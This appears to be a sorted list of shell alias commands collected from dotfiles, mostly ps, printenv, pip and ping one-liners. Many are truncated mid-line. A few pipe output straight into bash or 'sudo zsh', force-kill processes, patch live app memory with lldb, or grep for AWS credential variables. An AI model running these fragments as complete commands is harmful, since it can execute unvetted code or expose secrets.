ps aux|grep -i --color=auto
ps aux|grep -i $1
ps aux|grep -i
ps aux|grep --color=auto
ps aux|grep $zhr
ps aux|grep $1
ps aux|grep $(whoami)
ps aux|grep
ps aux|g
ps aux|fzf
ps aux|awk '{print \$4\
ps aux|awk '/[s]shd: unknown/{system(\
ps aux|awk
ps aux|a
ps aux| grep minicom
ps aux| grep \!*
ps aux| grep -i
ps aux| grep $1
ps aux| grep
ps auxxx | grep
ps auxx | grep mreid
ps auxw|grep -i
ps auxw|grep
ps auxww|less
ps auxww|grep -i
ps auxww|grep $1
ps auxww|grep
ps auxww|egrep \
ps auxww| grep -i
ps auxwwwwwww|ack -i $1
ps auxwwwww | less
ps auxwwww | grep $1
ps auxwwww | grep
ps auxwwwf | awk '{ foo[\$1] += \$6 } END { for (user in foo) { print foo[user] \
ps auxwww | more
ps auxwww | less
ps auxwww | grep sshd
ps auxwww | grep postgres
ps auxwww | grep nginx
ps auxwww | grep java
ps auxwww | grep freeswitch
ps auxwww | grep Dcatalina.home=
ps auxwww | grep -i
ps auxwww | grep
ps auxwww --forest | less -S
ps auxww |grep -i
ps auxww | grepi
ps auxww | grep selenium
ps auxww | grep ruby
ps auxww | grep postgres
ps auxww | grep meteor
ps auxww | grep gluster
ps auxww | grep firefox
ps auxww | grep bitcoind
ps auxww | grep ^postgres
ps auxww | grep -i CrashPlanService
ps auxww | grep -i
ps auxww | grep $USER
ps auxww | grep $1
ps auxww | grep
ps auxww | egrep \
ps auxww | egrep
ps auxwf | less
ps auxwf | grep
ps auxw | rg
ps auxw | more
ps auxw | grep post
ps auxw | grep nginx && sudo passenger-memory-stats
ps auxw | grep java
ps auxw | grep cue
ps auxw | grep -i
ps auxw | grep --color
ps auxw | grep $GREP_OPTIONS
ps auxw | grep $1
ps auxw | grep
ps auxw | egrep
ps auxw | ag --nocolor -i
ps auxw --sort -rss | $PAGER
ps auxm | head
ps auxf|less -S
ps auxf|grep $1
ps auxfw | less -S
ps auxf | sort -r -k 4
ps auxf | sort -r -k 3
ps auxf | sort -nr -k3
ps auxf | sort -nr -k 4'
ps auxf | sort -nr -k 4
ps auxf | sort -nr -k 3'
ps auxf | sort -nr -k 3
ps auxf | sort -nr -k -4
ps auxf | sort -n -k 4
ps auxf | sort -n -k 3
ps auxf | pager
ps auxf | less -Si
ps auxf | less
ps auxf | grep `whoami`
ps auxf | grep -v ]$
ps auxf | grep
ps auxf | fgrep -i
ps auxf | egrep --color=always --context=10 \$@
ps auxef|less -S
ps auxef | grep
ps auxc | less
ps auxc | awk
ps auxH -L | grep \
ps aux |less
ps aux |grepc
ps aux |grep'
ps aux |grep tstacy
ps aux |grep geth; echo 'tcp'; what_is_running_on 30303; echo 'udp'; lsof -i udp:30303
ps aux |grep bash
ps aux |grep -i
ps aux |grep -E -i
ps aux |grep --color=auto
ps aux |grep '
ps aux |grep
ps aux | vim -
ps aux | tail -10
ps aux | sort -nr -k 4
ps aux | sort -nr -k 3
ps aux | sort -nk4
ps aux | sort -nk3
ps aux | sort -nk 4
ps aux | sort -nk 3
ps aux | sort -nk +4
ps aux | sort -n -k 4
ps aux | sort -k 6
ps aux | sort
ps aux | sed -n 's/$USER.*Xvnc.*rfbport \([0-9]\+\).*/\1/p'
ps aux | rgi
ps aux | rg -i
ps aux | rg $1
ps aux | rg
ps aux | qf - -f 'kill -f {2}'
ps aux | percol
ps aux | peco
ps aux | more
ps aux | m
ps aux | less
ps aux | l
ps aux | head -11
ps aux | gw
ps aux | grepi
ps aux | grep vim
ps aux | grep uadmin
ps aux | grep tomcat
ps aux | grep suricata
ps aux | grep steam
ps aux | grep sshd
ps aux | grep ssh; echo 'kill <process_id> -- where process_id is the second column'
ps aux | grep ssh
ps aux | grep solr
ps aux | grep smon
ps aux | grep shrine
ps aux | grep sge
ps aux | grep rybka
ps aux | grep ruby
ps aux | grep rspec
ps aux | grep roscore
ps aux | grep ros
ps aux | grep root
ps aux | grep regula
ps aux | grep ranger
ps aux | grep rail
ps aux | grep rack
ps aux | grep python
ps aux | grep py
ps aux | grep puppet
ps aux | grep puma
ps aux | grep pulse
ps aux | grep program_agent
ps aux | grep postgres
ps aux | grep pmon
ps aux | grep php-fpm
ps aux | grep php
ps aux | grep node
ps aux | grep nginx
ps aux | grep mysqld
ps aux | grep mysql
ps aux | grep mysq[l]
ps aux | grep mongrel
ps aux | grep mongod
ps aux | grep mongo
ps aux | grep ml-instance
ps aux | grep kruegerd
ps aux | grep koss
ps aux | grep kodi
ps aux | grep jetty
ps aux | grep jboss
ps aux | grep java
ps aux | grep jade1
ps aux | grep iguana;
ps aux | grep httpd
ps aux | grep gzshen
ps aux | grep gulp
ps aux | grep grunt
ps aux | grep gpg-agent-info
ps aux | grep fuse
ps aux | grep firecracker
ps aux | grep emacs
ps aux | grep elixir
ps aux | grep docker-compose
ps aux | grep dev_app
ps aux | grep defunct;
ps aux | grep defunct
ps aux | grep daviddob
ps aux | grep dantopa
ps aux | grep chef-client
ps aux | grep btsync
ps aux | grep apache
ps aux | grep `whoami`
ps aux | grep \
ps aux | grep [s]potify > /dev/null && spotify show
ps aux | grep [p]ython
ps aux | grep [p]ostgres
ps aux | grep [c]om.acuityads.bid.router
ps aux | grep [c]f-
ps aux | grep [F]lux
ps aux | grep Z
ps aux | grep Ren
ps aux | grep Debug
ps aux | grep .jar
ps aux | grep -v \
ps aux | grep -v '\['
ps aux | grep -ni --color
ps aux | grep -iv ${1}
ps aux | grep -i twi
ps aux | grep -i ruby
ps aux | grep -i manage
ps aux | grep -i emacs
ps aux | grep -i -e apache -e python -e couch -e memcache -e mysql -e postgres -e pgpool -e nrpe -e nagios -e nginx -e redis -e que -e ruby -e god -e redsocks -e vim -e emacs -e tmux -e rabbit
ps aux | grep -i --color=always
ps aux | grep -i --color
ps aux | grep -i $@
ps aux | grep -i $1
ps aux | grep -i
ps aux | grep -e wine -e exe
ps aux | grep -e rsync -e borg
ps aux | grep -E
ps aux | grep -C 0
ps aux | grep --color=auto -i
ps aux | grep --color=auto $1
ps aux | grep --color=auto
ps aux | grep --color=always -i
ps aux | grep --color=always
ps aux | grep --color -i
ps aux | grep --color
ps aux | grep 'node '
ps aux | grep '[n]ginx'
ps aux | grep ''
ps aux | grep ${1}
ps aux | grep $USER
ps aux | grep $GREP_OPTIONS
ps aux | grep $@
ps aux | grep $1
ps aux | grep $*
ps aux | grep $(whoami)
ps aux | grep
ps aux | gr
ps aux | gi
ps aux | g
ps aux | fzy -l 20
ps aux | fzf-tmux
ps aux | fzf -m
ps aux | fzf
ps aux | filter
ps aux | egrep \
ps aux | egrep -w
ps aux | egrep -i --color
ps aux | egrep -i
ps aux | egrep --color
ps aux | egrep
ps aux | awk -v IGNORECASE=1
ps aux | awk '{print \$6/1024 \
ps aux | awk '{if (\$8==\
ps aux | awk '{ print $8
ps aux | awk '/pagekite/ && !/awk/ {print \$2\\t\$1\\t\$NF}'
ps aux | awk '!/Slack/ && !/WebStorm/ && !/Postman/ && !/Visual Studio Code/ && !/ionodecache/ && (/node/)'
ps aux | awk
ps aux | ag ruby
ps aux | ag -i
ps aux | ag $1
ps aux | ag
ps aux | ack node
ps aux | ack \
ps aux | ack -i
ps aux | ack $1
ps aux | ack
ps aux | \grep -G 'php.*'
ps aux | \grep -G 'mysql.*'
ps aux | \grep -G 'docker.*'
ps aux | \grep
ps aux | LC_ALL=C grep -i --color=auto
ps aux | (head -n 1; sort -nr -k 4;)
ps aux | (head -n 1; sort -nr -k 3;)
ps aux | ${PAGER}
ps aux | $PAGER
ps aux |
ps aux -xl | grep
ps aux -ww | ag $1
ps aux -vvv | grep -i
ps aux -rss | head
ps aux -A | grep -i
ps aux --sort=-rss -m | head -n
ps aux --sort=-resident|head -11
ps aux --sort=-pmem | head
ps aux --sort=-pcpu | head -n 6
ps aux --sort=-pcpu | head -n 10
ps aux --sort=-pcpu | head
ps aux --sort=-%mem | awk 'NR<=10{print \$0}'
ps aux --sort=-%mem | awk 'NR<=10{print $0}'
ps aux --sort=-%cpu | less -S
ps aux --sort=-%cpu | grep -m 11 -v `whoami`
ps aux --sort=-%cpu | grep -m 11 -v $(whoami)
ps aux --sort -rss | { head -1; grep python; }
ps aux --sort -rss | vim -
ps aux --sort -rss | more
ps aux --sort -rss | head -n11
ps aux --sort -rss | head -n 11
ps aux --sort -rss | head -20
ps aux --sort -rss | head
ps aux --sort -pmem | head -11
ps aux --sort -pcpu | head -11
ps aux --sort -pcpu | head
ps aux --sort -cpu | more
ps aux --sort -cpu | head -n 11
ps aux --sort -%cpu | less
ps aux --no-headers | awk '{print \$4 \
ps auwx|grep
ps auwx | sort -nk6
ps auwx | sort -nk5
ps auwx | sort -nk3
ps auwx | sort -n -k 3
ps auwx | grep tom.artale
ps auwx | grep gluster
ps auwx | grep cgrady
ps auwx | grep
ps auwx | ack -i
ps auwwx | perl -p -e 's/\n/\n\n/'
ps auwwx | head
ps auwwx | grep catalina.startup.Bootstrap
ps auwwx | grep -i -e ^USER -e
ps auwwx | grep
ps aufx | vimpager
ps aufx | grep -i
ps aufx | grep
ps aue | more
ps aucx | head -15
ps alxww|grep ruby
ps alx |grep
ps alx | grep
ps alx | awk '{printf (\
ps afx | sort -nr -k 4
ps afx | sort -nr -k 3
ps afux | less -S
ps a | grep repo
ps a | grep
ps >> ps.txt ; cat ps.txt | cut -c 1-11 ; rm ps.txt
ps -xvmr $* | less
ps -xavh | more -EwSq~
ps -xau | grep jsartor7
ps -xamv $* | less
ps -xa | grep postgres
ps -wwuax |grep
ps -wAf | grep java
ps -vxamrhw | more -EwSq~
ps -ux|less
ps -uxa | more
ps -uax | grep 'rails s'
ps -u $USER | grep
ps -ouid -C \!* | kill -9
ps -lef | grep java
ps -leaf | grep jhogklin
ps -leaf | grep $USER
ps -lA | grep '^. Z'
ps -lA | awk '$12 ==
ps -lA | awk
ps -fux|grep vnc
ps -fu $LOGNAME | grep -v grep
ps -fl axf | grep 'admin'
ps -feww | grep
ps -fel|grep -i java
ps -fea | grep $@
ps -fea | grep
ps -fe | grep -i recruiter
ps -fe | grep
ps -faux | grep
ps -fA | grep python
ps -fA | grep -i
ps -fA | grep
ps -f | cat
ps -f -u $USER | grep java
ps -f --user ohlushch | cat
ps -e|grep java
ps -eo vsize | awk
ps -eo rss | awk
ps -eo pcpu --no-headers | awk -v P=`nproc` '{S+=\$1}END{print P-S/100}'
ps -eo $PSARGS | more
ps -eo $PSARGS | egrep -iv
ps -eo $PSARGS | egrep -i
ps -elf|grep tallrice
ps -elf|grep
ps -elf | grep ssh-agent
ps -elf | grep php
ps -elf | grep openshift
ps -elf | grep java
ps -elf | grep firefox
ps -elf | grep bkeller
ps -elf | grep \!*
ps -elf | grep -i
ps -elf | grep $*
ps -elf | grep
ps -elFywwwww | less
ps -el | grep 'ssh -D'
ps -el | grep 'Z'
ps -el | grep
ps -ef|wc -l
ps -ef|grep uwsgi
ps -ef|grep tomcat
ps -ef|grep svr[d]
ps -ef|grep pmon
ps -ef|grep ora_
ps -ef|grep nginx
ps -ef|grep java
ps -ef|grep catalina
ps -ef|grep `whoami`
ps -ef|grep \!*
ps -ef|grep \
ps -ef|grep -i node
ps -ef|grep -i -e
ps -ef|grep -i --color=AUTO
ps -ef|grep -i
ps -ef|grep -E
ps -ef|grep $USER
ps -ef|grep $LOGNAME
ps -ef|grep $1
ps -ef|grep
ps -ef|ag
ps -ef|ack $@
ps -ef| grep python
ps -ef| grep -e arpwatc[h] -e swatc[h] -e scanlog[d]
ps -ef| grep
ps -efww | egrep -i
ps -eflw | grep
ps -efl | grep $@
ps -efjH | less
ps -efaux | grep
ps -efa | grep -i
ps -efa | grep
ps -efA | grep synergyc
ps -ef |grep java
ps -ef |grep -i -v root
ps -ef |grep -i
ps -ef |grep ${*}
ps -ef |grep
ps -ef | sed -n
ps -ef | rg -i
ps -ef | rg
ps -ef | pg
ps -ef | peco
ps -ef | more
ps -ef | less
ps -ef | grep wff-gateway.jar
ps -ef | grep weblogic
ps -ef | grep vnc
ps -ef | grep vertica
ps -ef | grep valgrind
ps -ef | grep tomcat-
ps -ef | grep tomcat
ps -ef | grep thttpd
ps -ef | grep stevens
ps -ef | grep spring
ps -ef | grep snmp
ps -ef | grep selenium
ps -ef | grep script
ps -ef | grep ruby
ps -ef | grep redis
ps -ef | grep python
ps -ef | grep pts
ps -ef | grep postgres
ps -ef | grep philip
ps -ef | grep nginx
ps -ef | grep ngin[x]
ps -ef | grep mongod
ps -ef | grep mongo
ps -ef | grep minio
ps -ef | grep mboghiu
ps -ef | grep lozou
ps -ef | grep logstash
ps -ef | grep kibana
ps -ef | grep kernel
ps -ef | grep java
ps -ef | grep gremlin
ps -ef | grep filebeat
ps -ef | grep ember
ps -ef | grep elasticsearch
ps -ef | grep deluge
ps -ef | grep command
ps -ef | grep cim
ps -ef | grep chaturbate --color=auto
ps -ef | grep alpern
ps -ef | grep `whoami`
ps -ef | grep ^I809989
ps -ef | grep \$1
ps -ef | grep \
ps -ef | grep [w]3m
ps -ef | grep [p]mon
ps -ef | grep [o]id
ps -ef | grep [m]ysql
ps -ef | grep [l]ogstash
ps -ef | grep [l]ogkeys
ps -ef | grep [k]ibana
ps -ef | grep [j]upyter
ps -ef | grep [e]lasticsearch
ps -ef | grep -vEi --color=always
ps -ef | grep -v grep
ps -ef | grep -n
ps -ef | grep -in
ps -ef | grep -i remvault
ps -ef | grep -i remnode
ps -ef | grep -i python
ps -ef | grep -i outlook
ps -ef | grep -i couchdb
ps -ef | grep -i --color
ps -ef | grep -i $1
ps -ef | grep -i
ps -ef | grep -a -i --color -P
ps -ef | grep -a -i --color -E
ps -ef | grep -Ei --color=always
ps -ef | grep --colour=auto
ps -ef | grep --color=auto -i $1
ps -ef | grep --color=auto $1
ps -ef | grep --color=auto
ps -ef | grep --color=always
ps -ef | grep --color
ps -ef | grep 'ssh -fN'
ps -ef | grep 'python'
ps -ef | grep 'node '
ps -ef | grep 'DataMgr'
ps -ef | grep ${USER}
ps -ef | grep $USERNAME
ps -ef | grep $USER --color=always
ps -ef | grep $USER
ps -ef | grep $ME
ps -ef | grep $@
ps -ef | grep $1
ps -ef | grep $*
ps -ef | grep $(whoami)
ps -ef | grep
ps -ef | fzf
ps -ef | fm
ps -ef | egrep [sp]mon
ps -ef | egrep -i
ps -ef | egrep
ps -ef | ag java
ps -ef | ag bundles/tomcat/
ps -ef | ag
ps -ef | ack --noenv --nocolor
ps -ef | a
ps -ef f| grep --color
ps -ef -ww | grep
ps -ef -W |grep
ps -ef --sort=vsize | tail
ps -ef --sort=pcpu | tail
ps -ef --forest | grep -B 3 -A 3
ps -edf | grep -i
ps -ed | grep $1
ps -ec | grep '$1'
ps -eawo 'user pid ppid vsz stime etime time tty args' | grep
ps -eaf|grep
ps -eafl | grep paciorek
ps -eaf |grep dhus
ps -eaf | grep VB*
ps -eaf | grep -i
ps -eaf | grep $USER
ps -eaf | grep $1
ps -eaf | grep
ps -eaW | grep
ps -eLf | grep -i python
ps -eH -o ppid,pid,euser,stat,%cpu,rss,args | grep ${USER}"
ps -eFl | grep -i
ps -eF |grep '\\.exe'
ps -eF | less
ps -eF | grep --color=auto
ps -eF | grep
ps -eF | awk '{print $11}'
ps -eF | ack
ps -eF --forest | grep postgres
ps -eA | grep ${1}
ps -e | sort -gr
ps -e | grep transmission
ps -e | grep emacs
ps -e | grep -iE
ps -e | grep -i emacs
ps -e | grep -i
ps -e | grep $@
ps -e | grep $1
ps -e | grep
ps -e | egrep
ps -e x -o ppid -o pid -o pgid -o tty -o vsz -o rss -o etime -o cputime -o rgroup -o ni -o fname -o args | grep
ps -e u | grep R
ps -e --sort=-rss | head -n 15
ps -df | grp
ps -deaf | grep fire; echo `date +%Y-%m-%d_%H.%M.%S`
ps -clf | grep $i
ps -a|grep
ps -axww | grep $*
ps -axw | grep
ps -axr -o %cpu -o %mem -o lstart -o ucomm -o pid| head -15
ps -axjf | grep -v -e lemonbar -e sleep -e chromium
ps -axf|?
ps -axf | sort -nr -k 4
ps -axf | sort -nr -k 3
ps -axf | less
ps -axf | grep -i $1
ps -ax |grep lm
ps -ax | less
ps -ax | grep active
ps -ax | grep AppleVNCServer && echo && echo Contents/MacOS/LockScreen && echo sudo_kill_-9_PID
ps -ax | grep -i postgres
ps -ax | grep -i
ps -ax | grep $1
ps -ax | grep
ps -ax -ww | grep
ps -awef |grep
ps -aux|grep -v
ps -aux|grep $1
ps -aux|grep
ps -aux|fzf
ps -aux|awk
ps -auxx|grep -i
ps -auxxx | grep jenkins
ps -auxwwwf|less -i
ps -auxwww | grep -i
ps -auxwww | grep
ps -auxww | less
ps -auxww | grep -i
ps -auxww | grep
ps -auxwf | grep -B8
ps -auxw |grep
ps -auxw | grep $1
ps -auxf | sort -nr -k 4
ps -auxf | sort -nr -k 3
ps -auxf | grep ${HOME}
ps -auxZ | less
ps -aux |grep -i
ps -aux |grep
ps -aux | sort -nr -k 4
ps -aux | sort -nr -k 3
ps -aux | more
ps -aux | less
ps -aux | grep zsh
ps -aux | grep ruby
ps -aux | grep rails
ps -aux | grep hoare
ps -aux | grep gazebo
ps -aux | grep cron
ps -aux | grep bash
ps -aux | grep `ps -p $$ -o ppid=`
ps -aux | grep -v root
ps -aux | grep -v '\['
ps -aux | grep -i .*$1.*
ps -aux | grep -i --color
ps -aux | grep -i $1
ps -aux | grep -i
ps -aux | grep $USER
ps -aux | grep $1
ps -aux | grep
ps -auwx | grep
ps -auwwwx | grep -i
ps -auwgx | grep $@
ps -auvjr397 | grep *java*
ps -au | grep
ps -ar $*| less
ps -all -A |grep
ps -ajxww | grep
ps -ajx | grep
ps -ajHfujlr|less
ps -afx | grep main
ps -afe | grep
ps -aef|grep
ps -aef |grep node
ps -aef |grep
ps -aef | grep owen
ps -aef | grep nginx
ps -aef | grep mlm
ps -aef | grep java
ps -aef | grep httpd
ps -aef | grep -i
ps -aef | grep ${USER}
ps -aef | grep $USER
ps -aef | grep $@
ps -aef | grep $1
ps -aef | grep
ps -aef | egrep '^ *$USER'
ps -aef --sort=start_time | awk '\$3 != 2'
ps -ae | grep
ps -aU $USER | more'
ps -a | grep node
ps -a | grep -i $1
ps -a | grep -i
ps -a | grep $1
ps -a | grep
ps -W | grep --color
ps -W | grep
ps -U ewnd9 | grep
ps -Heo $PSARGS | more
ps -HAcl -F S -A f | uniq -w3
ps -FeH | less
ps -F -ALL | grep
ps -C | grep
ps -C nautilus -o pid= | xargs kill -9
ps -C java -o pid= | xargs -I {} -r sh -c 'echo PID={} && jstack {}'
ps -C chrome -o pid= | xargs kill -9
ps -A|grep -i
ps -A|grep
ps -Ao user= | SORT
ps -Alfww --forest --headers|less
ps -Alf | grep
ps -Af|grep py
ps -Af|grep $1
ps -Af|'grep'
ps -Af| grep
ps -Afww | grep -i
ps -Afl | grep ssh
ps -AfH | grep
ps -Af |grep ^johnathan
ps -Af | grep yijiliu
ps -Af | grep runserver
ps -Af | grep -i runserver
ps -Af | grep -i $1
ps -Af | grep --color
ps -Af | grep ${USER}
ps -Af | grep $USER
ps -Af | grep $1
ps -Af | grep
ps -Aely --sort:rss | awk '{print \$NF\
ps -Aef | grep mongo
ps -Adf | grep -i
ps -AH | grep $*
ps -AH | grep
ps -AF | less -R
ps -AEf | grep -i
ps -A |grep
ps -A | rg
ps -A | l
ps -A | grep python
ps -A | grep play
ps -A | grep mongo
ps -A | grep lmgrd
ps -A | grep java
ps -A | grep core-cpu1
ps -A | grep -i stress
ps -A | grep -i -e rabbitmq -e mongod -e memcached
ps -A | grep -i
ps -A | grep $1
ps -A | grep
ps -A | g openconnect
ps -A | fzf
ps -A | egrep -i --color
ps -A | egrep -i
ps -A | ag
ps -A x |grep -i -e supervisor
ps -A x |grep -i -e rabbitmq
ps -A x |grep -i -e r_track_
ps -A x |grep -i -e r_main_
ps -A x |grep -i -e nginx
ps -A x |grep -i -e mongod
ps -A x |grep -i -e memcached
ps -A x | grep -i -e rabbitmq -e memcached -e mongod -e redis -e mysqld
ps -A x | grep -i -e python*
ps -A x | grep -i -e nginx -e rabbitmq -e memcached -e supervisord -e python* -e mongod
ps -A x | grep -i -e mongod -e memcached -e supervisord -e python*
ps -A f | less
ps -A -o user | sort -u
ps -A -o %mem | awk '{s+=$1}END{print s}'
ps -A -o %cpu | awk '{s+=\$1} END {print s \
ps -A -1 | grep `$1`
ps -A --no-headers | wc -l
ps --width 300 axf | less -S
ps --sort=start_time aux | grep
ps --forest -w | grep java
ps $PSSWITCHES|grep $LOGNAME
ps $PSG_OPTIONS | grep -i
prt-get listinst | grep
proxychains curl -s -I -L https://www.google.com/ | head -n 1
projects_without_next.py | pclip
progress -a | grep
prm `pacman --query --quiet --unrequired --deps | xargs`
private_cred | ssh synapse encfs ~/Private-enc ~/Private
printf `pwd` | xsel --clipboard
printf \\n\#%02X%02X%02X `xclip -o` | xclip -selection clipboard
printf \#%02X%02X%02X `xclip -o` | xclip -selection clipboard
printf 00:20:91:;openssl rand -hex 3|sed 's/\(..\)/\1:/g; s/.$//'
printf -- \${PATH}|tr -s ':' '\n';printf '\n'
printf '¯\_(ツ)_/¯' | pbcopy
printf 'p *(char*)(void(*)())AudioDeviceDuck=0xc3\nq' | lldb -n QQ
printf 'p (char)(void(*)())AudioDeviceDuck=0xc3\nq' | lldb -n FaceTime
printf 'import pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn as sns\nimport numpy as np\n\n%%matplotlib inline' | pbcopy
printf 'HOST LIST\n---------\n'; grep '^Host' $HOME/.ssh/config | sed 's/Host //'
printf '(╯°□°)╯︵ ┻━┻' | pbcopy
printf '(ง'̀-'́)ง' | pbcopy
printf '%s\r\n' \$(\dirs) | awk '{print NR-1\
printf '%s' $(pwd) | pbcopy; echo \
printf '$leetcode_username\n$leetcode_password' | leetcode user -l
printf '## ' && gitb && git status | less
printf '## ' && gitb && git status . | less
printf '## ' && gitb && git status --ignored | less
printf ' %f %f' gzip -c $1 | wc -c; du -sch $1
printf %s '$SHRUG' | $CLIPBOARDCOPY && echo '$SHRUG'
printf $PWD | xclip -i
printf $CMSSW_RELEASE_BASE/src | clip
printenv|sort
printenv|grep -i
printenv | sort -f
printenv | sort
printenv | sed '/.:./ { s/:/\n\t/g; }'
printenv | less # List All Environment Variables
printenv | less
printenv | grep proxy
printenv | grep SVN
printenv | grep ROS
printenv | grep DOCK
printenv | grep CVS
printenv | grep CLEARCASE_CMDLINE
printenv | grep AWS_SHARED_CREDENTIALS_FILE
printenv | grep AWS_PROFILE
printenv | grep AWS_
printenv | grep AWS
printenv | grep -i -e ROS -e CATKIN -e CMAKE -e RMW
printenv | grep -i
printenv | grep -P
printenv | grep --color
printenv | grep
printenv | fzf
printenv | ack -i
printenv PATH | tr ':' '\n'
print_help | less
print ~/.local/share/vlc/$(ls -t ~/.local/share/vlc/ |head -1)
print -z $(history -a -n -r 1| fzf --height=10 --reverse)
print -z $(find . | peco)
print -z $(find . -type f | peco)
print -z $(find . -type f | fzf)
print -z $(find . -type d | peco)
print -z $(find . -type d | fzf)
print -l ${^path}/*(-*N) | less
print -l ${(ok)functions} | less
print -l ${(ok)functions} | grep
print -l $BAT_LANGS | fzf --preview 'bat ~/.config/emby-server/logs/embyserver.txt --color=always --italic-text=always --decorations=always --tabs=0 --paging=never --wrap=never --theme=
print 'apt-get update && apt-file update' | sudo zsh -s
primo | editor -
pretty_json | pygmentize -l javascript
ppunsource; pip freeze | grep -v
pps(){ pip search $1 | sort; unset -f pps; }; pps
pps | grep
pp | xargs wget
pp | xargs git clone
pp | xargs curl -s
pp | bash
postcss src/css/*.css --use autoprefixer -dir dist/css/;eslint src/js/*.js && babel src/js/main.js | uglifyjs > dist/js/main.js; echo 'success'
portsa | egrep -i
ports | grep
ports | egrep -i
ports | /usr/bin/grep
portageq envvar USE | xargs -n 1
portageq envvar FEATURES | xargs -n 1
port list | grep -i
port installed | grep -v active
port installed | grep
port installed active | grep -i
popd +9 >/dev/null;dirs -v|sed '1d'
popd +8 >/dev/null;dirs -v|sed '1d'
popd +7 >/dev/null;dirs -v|sed '1d'
popd +6 >/dev/null;dirs -v|sed '1d'
popd +5 >/dev/null;dirs -v|sed '1d'
popd +4 >/dev/null;dirs -v|sed '1d'
popd +3 >/dev/null;dirs -v|sed '1d'
popd +2 >/dev/null;dirs -v|sed '1d'
popd +1 >/dev/null;dirs -v|sed '1d'
pockyt get -n 1 -s unread -t work -o browser | pockyt mod -a 1 -i redirect
pngpaste - | tshort -e .png
pngpaste - | tesseract stdin stdout
pmset -g ps | sed -n 's/.*[[:blank:]]+*\(.*%\).*/\1/p'
pmset -g ps | grep -oP '(\d+)%'
pmset -g log|grep -e ' Sleep ' -e ' Wake '
pmset -g log | grep \
pmset -g log | grep -e ' Sleep ' -e ' Wake '
pmset -g batt | grep -o '[0-9]*%'
pmset -g batt | grep -Eo \
pmset -g batt | egrep \
pmset -g batt | egrep -o '[0-9]+%' --color=never
pmset -g batt | egrep
pmset -g batt | awk '/^ /{print \$5}'
pmchk | wc -l
pm_$(echo $pm | sed
pm2 restart all | pm2 logs
pm2 logs --raw | pretty
pm2 logs --raw | bunyan -L
pm2 logs --raw | bunyan --strict -c '!this.req' -L -o short
pm2 logs --raw | bunyan
plversiondrift | column -t
plla | egrep -i
pll | egrep -i
pld | grepi
pla | egrep -i
pl | egrep -i
pkill compton; xcolor | tee >(xsel -ib) >(echo); compton &
pkill -laf 'node|puma'
pkill -f rosmaster & pkill -f roscore & ps aux | grep ros
pkill -9 -l '^Rz[Updater|DeviceEngine]'
pkgutil --packages | grep nektar
pkgsnc | column
pkgman list installed | peco
pkginfo | grep -irn
pkginfo | grep -i
pkginfo -i | wc -l
pkginfo -i | grep -i
pkg_version|grep \<
pkg_info|wc -l
pkg_info | grep -iE
pkg_info | grep -i
pkg-config --list-all | grep
pkg version -v | grep -v '='
pkg query -e '%a=0' '%o-%v' | sort
pkg query %n | grep -i
pkg audit | less
pj | pbcopy
pitanga log | less -R
pipupgrade --latest --yes;pip list --outdated --format=freeze | grep -v
pipes.sh -s 5 -r 0|lc
pipenv graph | less
pipdeptree -fl | grep -P '^\w'
pip3.7 list --outdated --format=freeze | grep -v
pip3 list | less
pip3 list | cut -d
pip3 list -o | grep -E -v
pip3 list --outdated --local --user --format=columns 2> /dev/null | tail --lines=+3
pip3 list --outdated --format=legacy | awk
pip3 list --outdated --format=freeze | rg -v
pip3 list --outdated --format=freeze | grep -v
pip3 list --local --outdated --format=freeze | grep -v
pip3 install --upgrade pip; pip3 freeze --local | grep -v
pip3 install --upgrade pip && pip3 freeze --local | grep -v
pip3 freeze | xargs pip3 uninstall -y
pip3 freeze | grep -i
pip3 freeze | grep
pip3 freeze | $PAGER
pip3 freeze --user | cut -d
pip3 freeze --user | awk -F '==' '{print $1}' > $HOME/tmp/requirements.txt && pip install --user --upgrade -r $HOME/tmp/requirements.txt
pip3 freeze --local | xargs -n1 pip3 uninstall -y
pip3 freeze --local | xargs -n1 pip3 install -U
pip3 freeze --local | grep -v \
pip3 freeze --local | grep -v
pip2.7 freeze --local | grep -v
pip2 list | cut -d
pip2 list --local --outdated --format=freeze | grep -v
pip2 install --upgrade pip && pip2 freeze --local | grep -v
pip2 freeze | xargs pip2 uninstall -y
pip2 freeze --user | cut -d
pip2 freeze --local | grep -v
pip-compile --upgrade --dry-run | diff -i requirements.txt -
pip uninstall -y $(pip freeze | cut -d= -f1)
pip list | grep -i
pip list | grep
pip list -o | grep -E -v
pip list -o --format=freeze | cut -d
pip list --outdated | cut -d
pip list --outdated | awk
pip list --outdated --format=legacy | awk
pip list --outdated --format=freeze | rg -v
pip list --outdated --format=freeze | grep -v
pip list --outdated --format=freeze --user | xargs -n1
pip list --outdated --format=columns | grep -f ~/.dotfiles/default-pips
pip install -U `pip list --outdated | awk '{print $1}'`
pip install -U $(pip freeze | cut -d
pip install --upgrade pip setuptools && pip freeze --local | grep -v
pip install --upgrade pip \`pip list --outdated | awk 'NR>2 {print \$1}'\`
pip install --upgrade pip $(pip freeze | egrep -v --
pip install --upgrade \$(pip list -o | awk 'NR > 2 { print \$1 }')
pip install $(pip list --outdated | awk
pip freeze | xargs pip uninstall -y
pip freeze | xargs pip install --upgrade
pip freeze | tee requirements.txt
pip freeze | sort
pip freeze | sed 's/^M$//'
pip freeze | pip install --upgrade -r /dev/stdin
pip freeze | less
pip freeze | grep sdetools
pip freeze | grep -vFxf ignore_requirements.txt
pip freeze | grep -v pkg-resources > requirements.txt
pip freeze | grep -v \
pip freeze | grep -v 'pkg-resources' > requirements.txt
pip freeze | grep -i
pip freeze | grep
pip freeze --local | xargs -n1 sudo -H pip uninstall -y
pip freeze --local | xargs -n1 sudo -H pip install -U
pip freeze --local | xargs -n1 pip uninstall -y
pip freeze --local | xargs -n1 pip install -U
pip freeze --local | grep -v \
pip freeze --local | grep -v '^\-e' > requirements.txt
pip freeze --local | grep -v $@ > requirements.txt
pip freeze --local | grep -v
pip freeze --local | get_cols -F
ping6 \$(/sbin/ip -6 route | awk '/default/ { print \$3 }')
ping ya.ru | grep -E --only-match --color=never '[0-9\.]+ ms'
ping vg.no | awk -F = {'print \$4'}
ping google.sk | grep -E --only-match --color=never '[0-9\.]+ ms'
ping google.com | grep -E --only-match --color=never '[0-9\.]+ ms'
ping gdns |& lnav -qt
ping \$(/sbin/ip route | awk '/default/ { print \$3 }')
ping 8.8.8.8 | ts
ping 8.8.8.8 | lolcat
ping 192.168.10.1 | ts
ping 192.168.1.1|lolcat
ping 192.168.0.1 | ts
ping 127.0.0.1 | ccze -c ansi
ping 127.0.0.1 | ccze - mode ansi
ping -v google.com | while read line; do echo `gdate +%Y-%m-%d\ %H:%M:%S:%N` $line; done
